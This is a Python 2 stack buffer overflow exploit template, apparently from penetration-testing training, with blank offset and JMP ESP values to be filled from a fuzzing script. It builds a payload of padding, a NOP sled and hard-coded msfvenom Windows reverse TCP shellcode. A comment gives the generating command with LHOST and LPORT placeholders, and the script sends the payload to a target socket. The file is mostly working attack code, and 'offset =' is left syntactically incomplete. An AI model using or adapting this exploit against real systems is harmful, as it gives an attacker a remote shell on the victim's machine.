#!/usr/bin/python
import argparse, sys
import socket as so

parser = argparse.ArgumentParser()
parser.add_argument("-t","--target",type=str,metavar="",help="Target IP address")
parser.add_argument("-p","--port",type=int,metavar="",help="Target port")
input = parser.parse_args()

if (len(sys.argv) < 3):
	parser.print_help()
	sys.exit(0)

#Insert the values output from the simple-fuzz.py script below
offset = 
jmpesp = ""

#shellcode: msfvenom -p windows/shell_reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f c -e x86/shikata_ga_nai -b "\x00\x0a"
shellcode = (
"\xdb\xd0\xba\x34\x9c\xd1\x43\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x56\x17\x03\x56\x17\x83\xda\x60\x33\xb6\xde\x71\x36"
"\x39\x1e\x82\x57\xb3\xfb\xb3\x57\xa7\x88\xe4\x67\xa3\xdc\x08"
"\x03\xe1\xf4\x9b\x61\x2e\xfb\x2c\xcf\x08\x32\xac\x7c\x68\x55"
"\x2e\x7f\xbd\xb5\x0f\xb0\xb0\xb4\x48\xad\x39\xe4\x01\xb9\xec"
"\x18\x25\xf7\x2c\x93\x75\x19\x35\x40\xcd\x18\x14\xd7\x45\x43"
"\xb6\xd6\x8a\xff\xff\xc0\xcf\x3a\x49\x7b\x3b\xb0\x48\xad\x75"
"\x39\xe6\x90\xb9\xc8\xf6\xd5\x7e\x33\x8d\x2f\x7d\xce\x96\xf4"
"\xff\x14\x12\xee\x58\xde\x84\xca\x59\x33\x52\x99\x56\xf8\x10"
"\xc5\x7a\xff\xf5\x7e\x86\x74\xf8\x50\x0e\xce\xdf\x74\x4a\x94"
"\x7e\x2d\x36\x7b\x7e\x2d\x99\x24\xda\x26\x34\x30\x57\x65\x51"
"\xf5\x5a\x95\xa1\x91\xed\xe6\x93\x3e\x46\x60\x98\xb7\x40\x77"
"\xdf\xed\x35\xe7\x1e\x0e\x46\x2e\xe5\x5a\x16\x58\xcc\xe2\xfd"
"\x98\xf1\x36\x51\xc8\x5d\xe9\x12\xb8\x1d\x59\xfb\xd2\x91\x86"
"\x1b\xdd\x7b\xaf\xb6\x24\xec\xda\x4d\x26\xc4\xb2\x53\x26\x15"
"\xf8\xdd\xc0\x7f\xee\x8b\x5b\xe8\x97\x91\x17\x89\x58\x0c\x52"
"\x89\xd3\xa3\xa3\x44\x14\xc9\xb7\x31\xd4\x84\xe5\x94\xeb\x32"
"\x81\x7b\x79\xd9\x51\xf5\x62\x76\x06\x52\x54\x8f\xc2\x4e\xcf"
"\x39\xf0\x92\x89\x02\xb0\x48\x6a\x8c\x39\x1c\xd6\xaa\x29\xd8"
"\xd7\xf6\x1d\xb4\x81\xa0\xcb\x72\x78\x03\xa5\x2c\xd7\xcd\x21"
"\xa8\x1b\xce\x37\xb5\x71\xb8\xd7\x04\x2c\xfd\xe8\xa9\xb8\x09"
"\x91\xd7\x58\xf5\x48\x5c\x68\xbc\xd0\xf5\xe1\x19\x81\x47\x6c"
"\x9a\x7c\x8b\x89\x19\x74\x74\x6e\x01\xfd\x71\x2a\x85\xee\x0b"
"\x23\x60\x10\xbf\x44\xa1"
)

#Modify number of NOPs if required
bof = "A" * offset + jmpesp + "\x90" * 16 + shellcode
s = so.socket(so.AF_INET, so.SOCK_STREAM)
print "#########################"
print "#        YEEHAW!"       #"
print "#########################"
try:
     s.connect((input.target, input.port))
     print repr(s.recv(1024))
     s.send(bof)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
